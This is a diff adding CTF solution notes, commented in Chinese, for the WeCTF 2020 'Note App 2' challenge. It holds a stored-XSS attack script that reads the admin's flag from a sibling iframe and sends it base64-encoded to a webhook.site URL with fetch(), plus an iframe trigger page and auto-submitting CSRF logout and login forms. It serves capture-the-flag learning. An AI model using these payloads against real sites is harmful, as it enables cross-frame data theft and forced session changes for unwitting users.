@@ -1,0 +1,85 @@
+# Note App 2 (CSRF + XFS)
+# chall:   https://github.com/wectf/2020/tree/master/note_app_2
+# Writeup: https://github.com/wectf/2020
+
+# 1. 原題目沒有說 admin 可以閱讀所有 note, 但不合理, 所以這題修改 api.py 的 get_note_detail, 讓 admin 可以讀所有 note
+# 2. writeup text2.html 和 text3.html 在實做上並不合理, 因為登出後 token 會被清掉, 導致 iframe3 無法載入, 下面稍做修改, 先載入 iframe2 和 iframe3, 再依序觸發
+# 3. 為什麼要讓 admin logout 在以你的身份 login 呢 ? 應該能直接將 flag 發送到 webhook 阿, 因此下面我只用兩個 iframe
+# 4. token (cookie) 部份因為有 httpOnly 所以沒辦法用 js 取出送到 webhook
+
+# 攻擊流程
+# 0. 修改 attack script 的 webhook site
+# 1. 登入使用者 a, a
+# 2. 將 attack script 複製到 note, 編號應為 2 號, note/1 是 flag
+# 3. 將 triger script 複製到 note, 編號為 3 號
+# 4. 用 admin 登入, 訪問 note/3
+# 5. 到 webhook site 取 flag
+
+
+# trigger script
+<div id=iframe1></div>
+<div id=iframe2></div>
+<script>
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+async function main(){
+    ifr = document.createElement('iframe');
+    ifr.src = "http://localhost:5000/note/1";
+    ifr.name='admin';
+    iframe1.appendChild(ifr);
+    await sleep(1000);
+    ifr2 = document.createElement('iframe');
+    ifr2.name='attack';
+    ifr2.src = "http://localhost:5000/note/2";
+    iframe2.appendChild(ifr2);
+}
+main();
+</script>
+
+
+# atack script
+<script>
+    flag = window.top.frames[0].document.getElementsByTagName('div')[1].innerHTML;
+    console.log('flag = ', flag);
+    fetch('https://webhook.site/01128819-c441-4362-9151-3d7dd3c4a819?'+btoa(flag));
+</script>
+
+
+# test2.html  (logout)
+<form method="post" action="http://localhost:5000/logout" id="s">
+    <input type="submit">
+</form>
+<script>
+    function sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function foo() {
+        await sleep(2000);
+        document.getElementById("s").submit();
+    }
+foo();
+</script>
+
+
+# test3.html  (login)
+<form method="post" action="http://localhost:5000/" id="s">
+    <input name="username" value="a">
+    <input name="password" value="a">
+
+    <input type="submit">
+</form>
+<script>
+    function sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function foo() {
+        await sleep(3000);
+        document.getElementById("s").submit();
+    
+    }
+
+foo();
+</script>
